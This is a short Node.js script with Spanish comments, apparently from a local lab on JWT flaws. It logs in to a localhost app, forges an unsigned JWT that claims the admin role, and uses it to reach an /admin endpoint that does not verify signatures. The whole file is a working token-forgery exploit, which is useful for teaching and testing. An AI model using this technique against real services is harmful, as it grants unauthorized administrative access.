const axios = require('axios');
const { base64urlEncode } = require('./utils');

async function main() {
  // 1) Obtener un token válido (pero la firma no importa en /admin vulnerable)
  const login = await axios.post('http://localhost:3000/login', {
    username: 'juan',
    password: 'juan123'
  });
  const original = login.data.token;
  console.log('[forge] Token original:', original);

  // 2) Falsificar payload: cambiar role a admin
  const header = { alg: 'HS256', typ: 'JWT' };
  const payload = { user: 'juan', role: 'admin', forged: true };
  const tokenForged = `${base64urlEncode(header)}.${base64urlEncode(payload)}.anything`;
  console.log('[forge] Token falsificado:', tokenForged);

  // 3) Llamar a /admin vulnerable (no verifica firma) y obtener acceso
  const res = await axios.get('http://localhost:3000/admin', {
    headers: { Authorization: `Bearer ${tokenForged}` }
  });
  console.log('[forge] Respuesta /admin:', res.data);
}

main().catch(err => {
  if (err.response) console.error('HTTP', err.response.status, err.response.data);
  else console.error(err.message);
  process.exit(1);
});
